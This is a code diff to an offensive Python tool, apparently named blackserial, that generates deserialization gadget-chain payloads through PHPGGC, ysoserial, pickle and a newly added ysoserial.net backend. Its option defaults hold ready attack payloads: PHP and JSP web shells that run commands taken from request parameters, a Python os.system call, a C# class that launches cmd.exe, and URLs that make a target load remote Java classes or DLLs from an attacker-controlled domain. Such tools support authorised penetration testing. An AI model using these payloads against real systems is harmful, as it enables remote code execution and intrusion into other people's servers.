@@ -50,6 +50,8 @@ def createGenerator(serializer, args):
         generator = YSOSerial(args.java_path, args.ysoserial_path, args)
     elif serializer == 'pickle':
         generator = Pickle(args)
+    elif serializer == 'ysoserial.net':
+        generator = YSOSerialNet(args.wine_path, args.ysoserial_net_path, args)
     else:
         logging.error(f"Unsupported serializer: {serializer}")
         generator = None
@@ -68,10 +70,10 @@ if __name__ == '__main__':
     parser.add_argument('chains', help="Specific gadget chain to generate", nargs='*') 
 
     common_group = parser.add_argument_group('general options')
-    common_group.add_argument('-o', '--out', help="Output payloads to file", default="payloads.txt")
+    common_group.add_argument('-o', '--out', help="Output payloads to file", default="blackserial-payloads.txt")
     common_group.add_argument('-l', '--list', help="List payloads only", action="store_true")
     common_group.add_argument('-s', '--serializer', help="Gadget chain serializer", choices=available_serializers + ['all'], default='phpggc')
-    common_group.add_argument('-nc', '--no-color', help='No colored output', action="store_true")
+    common_group.add_argument('-n', '--no-color', help='No colored output', action="store_true")
     common_group.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")    
 
     payload_group = parser.add_argument_group('payload')
@@ -88,23 +90,34 @@ if __name__ == '__main__':
 
     # php specific
     phpggc_group = parser.add_argument_group('phpggc')
-    phpggc_group.add_argument('-pg', '--phpggc-path', help="Full path to PHPGGC bin", default="phpggc")
-    phpggc_group.add_argument('-pf', '--php-functions', help="PHP Functions comma-separated list, used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
-    phpggc_group.add_argument('-pc', '--php-code', help="PHP Code or filepath to a file used for 'RCE: PHP Code' and 'File Write' chains", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
-    phpggc_group.add_argument('-po', '--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
+    phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./phpggc/phpggc")
+    phpggc_group.add_argument('--php-functions', help="PHP Functions comma-separated list, used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
+    phpggc_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
+    phpggc_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
 
     # java specific
     ysoserial_group = parser.add_argument_group('ysoserial')
-    ysoserial_group.add_argument('-jp', '--java-path', help="Full path to java bin", default="java")
-    ysoserial_group.add_argument('-jy', '--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial.jar")
-    ysoserial_group.add_argument('-jc', '--jsp-code', help="JSP Code or filepath to a file used for 'File Write' type chains", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
-    ysoserial_group.add_argument('-jr', '--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%%domain%%/%%chain_id%%")
-    ysoserial_group.add_argument('-jl', '--java-classname', help="Java class name used for remote dynamic loading", default="Main")
+    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="java")
+    ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial-all.jar")
+    ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
+    ysoserial_group.add_argument('--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%%domain%%/%%chain_id%%")
+    ysoserial_group.add_argument('--java-classname', help="Java class name used for remote dynamic loading", default="Main")
 
     # python specific
     pickle_group = parser.add_argument_group('pickle')
-    pickle_group.add_argument('-yc', '--python-code', help="Python Code or filepath to a file containing the code", default="import os; os.system('%%system_command%%')")
+    pickle_group.add_argument('--python-code', help="Python Code or path to a file containing the code", default="import os; os.system('%%system_command%%')")
     
+    # .net specific
+    net_group = parser.add_argument_group('ysoserial.net')
+    net_group.add_argument('--csharp-code', help="C# Code or path to a file containing the C# code (ex: exploit.cs).", default="using System.Diagnostics;public class Exploit{public Exploit(){System.Diagnostics.Process.Start(\"cmd.exe\",\"/c %%system_command%%\");}}")
+    net_group.add_argument('--csharp-code-dlls', help="Semicolon list of DLLs dependencies to compile C# code", default="System.dll")
+    net_group.add_argument('--csharp-remote-dll', help="URL or SMB path to make the chain load remotely a DLL and execute it", default="https://%%domain%%/%%chain_id%%.dll")
+    net_group.add_argument('--csharp-net-remoting', help="URL .Net remoting proxy, transports tcp, http, ipc are supported (https://github.com/codewhitesec/RogueRemotingServer>)", default="http://%%domain%%/%%chain_id%%")
+    net_group.add_argument('--ysoserial-net-formatters', help="Only use this list of YSOSerial.net formatters, comma-separated")
+    net_group.add_argument('--ysoserial-net-path', help="Full path to YSOSerial.net exe", default="./Release/ysoserial.exe")
+    net_group.add_argument('--ysoserial-net-options', help="Options to pass to YSOSerial.net command line", default="")
+    net_group.add_argument('--wine-path', help="Full path to wine bin (linux only)", default="wine")
+
     args = parser.parse_args()
 
     setupLogging(args.no_color, args.verbose)
@@ -150,7 +163,7 @@ if __name__ == '__main__':
 
         if args.list:
             for chain in chains:
-                print(chain['name'])
+                print(chain['description'])
             continue
         
         if args.chains:
